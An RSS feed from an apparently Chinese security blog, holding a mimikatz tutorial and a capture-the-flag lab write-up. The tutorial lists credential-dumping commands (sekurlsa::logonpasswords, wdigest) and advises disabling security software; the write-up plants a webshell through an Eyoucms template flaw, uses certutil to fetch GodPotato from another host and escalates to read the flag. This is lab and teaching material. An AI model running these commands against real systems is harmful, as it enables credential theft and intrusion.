@@ -1,0 +1,202 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>内网 on 1ux4ry Archive</title><link>https://luxuryzcx.github.io/tags/%E5%86%85%E7%BD%91/</link><description>Recent content in 内网 on 1ux4ry Archive</description><generator>Hugo</generator><language>zh-cn</language><lastBuildDate>Wed, 17 Jun 2026 09:12:54 +0800</lastBuildDate><atom:link href="https://luxuryzcx.github.io/tags/%E5%86%85%E7%BD%91/index.xml" rel="self" type="application/rss+xml"/><item><title>mimikatz</title><link>https://luxuryzcx.github.io/posts/mimikatz/</link><pubDate>Wed, 17 Jun 2026 09:12:54 +0800</pubDate><guid>https://luxuryzcx.github.io/posts/mimikatz/</guid><description>&lt;h1 id="前言"&gt;前言&lt;/h1&gt;
+&lt;p&gt;&lt;strong&gt;mimikatz&lt;/strong&gt;是一款简单且好用的windows密码抓取神器，该软件可帮助用户一键抓取window密码，操作简单、使用方便。mimikatz 2.1新版能够通过获取的kerberos登录凭据，绕过支持RestrictedAdmin模式的win8或win2012svr的远程终端（RDP）的登陆认证，建议默认禁止RestrictedAdmin模式登录。在使用mimikatz2.1时，请关闭本机所有的安全软件，因为其属于黑客程序，安全软件不退出就无法运行。&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260617090827439.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;h1 id="mimikatz使用教程"&gt;mimikatz使用教程&lt;/h1&gt;
+&lt;p&gt;一、获取windows密码的方法很简单，mimikatz2.1版本的只需要三步操作就可以了&lt;/p&gt;
+&lt;p&gt;1、首先打开mimikatz2.1，该版本分为32位和64位，用户可根据自己计算机的操作系统进行相应选择，若不知道自己的操作系统位数，请鼠标右键点击“计算机”-“属性”，在系统类型中即可知晓。&lt;/p&gt;
+&lt;p&gt;2、打开之后先输入privilege::debug //提升权限。&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260617090841213.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;2、输入sekurlsa::logonpasswords //抓取密码。&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260617090900571.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;3、再次输入sekurlsa::wdigest获取kerberos用户信息及Windows密码&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260617090916488.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;h1 id="一些命令"&gt;一些命令&lt;/h1&gt;
+&lt;p&gt;一、常规的操作使用命令&lt;/p&gt;
+&lt;p&gt;1、mimikatz # cls &amp;ndash;&amp;gt;清屏，类似dos命令cls&lt;/p&gt;
+&lt;p&gt;2、mimikatz # exit &amp;ndash;&amp;gt;退出mimikatz&lt;/p&gt;
+&lt;p&gt;3、mimikatz # version &amp;ndash;&amp;gt;查看当前的mimikatz的版本&lt;/p&gt;
+&lt;p&gt;二、系统方面的操作使用命令：system&lt;/p&gt;
+&lt;p&gt;1、mimikatz # system ::user &amp;ndash;&amp;gt;查看当前登录的系统用户&lt;/p&gt;
+&lt;p&gt;2、mimikazt # system ::computer &amp;ndash;&amp;gt;返回当前的计算机名称&lt;/p&gt;
+&lt;p&gt;三、在服务器终端的操作命令： ts&lt;/p&gt;
+&lt;p&gt;1、mimikatz # ts ::sessions &amp;ndash;&amp;gt;显示当前的会话&lt;/p&gt;
+&lt;p&gt;2、mimikatz # ts ::processes windows-d.vm.nirvana.local &amp;ndash;&amp;gt;显示服务器的进程和对应的pid情况等&lt;/p&gt;
+&lt;p&gt;四、系统服务相关的操作使用命令：service&lt;/p&gt;
+&lt;p&gt;五、系统进程相关操作的使用命令：process&lt;/p&gt;
+&lt;p&gt;六、系统线程相关操作使用命令：thread&lt;/p&gt;
+&lt;p&gt;七、系统句柄相关操作使用命令：handle&lt;/p&gt;
+&lt;p&gt;八、加密相关操作使用命令：crypto&lt;/p&gt;
+&lt;p&gt;九、注入操作使用命令：inject&lt;/p&gt;
+&lt;p&gt;十、其他基础命令&lt;/p&gt;
+&lt;p&gt;1、cls清屏&lt;/p&gt;
+&lt;p&gt;2、exit退出&lt;/p&gt;
+&lt;p&gt;3、version查看mimikatz的版本&lt;/p&gt;
+&lt;p&gt;4、help查看帮助信息&lt;/p&gt;
+&lt;p&gt;5、system::user查看当前登录的系统用户&lt;/p&gt;
+&lt;p&gt;6、system::computer查看计算机名称&lt;/p&gt;
+&lt;p&gt;7、process::list列出进程&lt;/p&gt;
+&lt;p&gt;8、process::suspend进程名称-暂停进程&lt;/p&gt;
+&lt;p&gt;9、process::stop进程名称-结束进程&lt;/p&gt;
+&lt;p&gt;10、process::modules列出系统的核心模块及所在位置&lt;/p&gt;</description></item><item><title>PT-3</title><link>https://luxuryzcx.github.io/posts/pt-3/</link><pubDate>Mon, 15 Jun 2026 23:22:42 +0800</pubDate><guid>https://luxuryzcx.github.io/posts/pt-3/</guid><description>&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260416162555227.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;目录扫描有后台 弱口令 cyberstrikelab 123456&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260416162815044.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;然后直接搜 rce&lt;/p&gt;
+&lt;p&gt;Eyoucms v1.4.3 版本后台修改模板文件可代码执行&lt;/p&gt;
+&lt;p&gt;插入一句话木马&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260416183400098.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;蚁剑连接&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260416183512844.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;发现有一个flag 文件 但是刷新发现文件不完整&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260416183703557.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;结果命令一看然后发现有问题&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260416203110302.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;然后立即进行想到 烂土豆提权&lt;/p&gt;
+&lt;p&gt;本地起一个HTTP服务&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260416203224852.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260416203239725.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;然后下载即可&lt;/p&gt;
+&lt;p&gt;certutil -urlcache -split -f http://172.16.233.2/GodPotato-NET4.exe C:\ps\WWW\uploads\gp.exe&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-c" data-lang="c"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;gp&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exe&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;cmd&lt;/span&gt; &lt;span class="s"&gt;&amp;#34;whoami&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后提权 成功了&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260416203333725.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;搜索C盘的flag文件&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-c" data-lang="c"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;gp&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exe&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;cmd&lt;/span&gt; &lt;span class="s"&gt;&amp;#34;cmd /c dir C:\*flag* /s /b&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260416203529219.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-c" data-lang="c"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;gp&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exe&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;cmd&lt;/span&gt; &lt;span class="s"&gt;&amp;#34;cmd /c type C:\ps&lt;/span&gt;&lt;span class="se"&gt;\f&lt;/span&gt;&lt;span class="s"&gt;lag.txt&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260416203608396.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;go-flag{a4645a82-9cc1-4c1b-a834-bbae67bac22c}&lt;/p&gt;</description></item></channel></rss>
